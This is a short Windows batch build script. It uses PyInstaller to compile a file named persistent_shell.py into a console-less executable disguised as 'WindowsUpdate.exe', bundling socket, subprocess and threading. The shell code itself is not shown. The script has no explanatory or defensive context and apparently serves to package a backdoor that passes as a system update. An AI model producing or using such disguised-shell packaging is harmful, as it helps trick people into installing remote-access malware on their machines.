@echo off
echo Building PERSISTENT SHELL EXE...
pyinstaller --onefile --windowed --name WindowsUpdate.exe --hidden-import socket --hidden-import subprocess --hidden-import threading --hidden-import time --hidden-import os --hidden-import sys persistent_shell.py
echo Done! Check dist folder
pause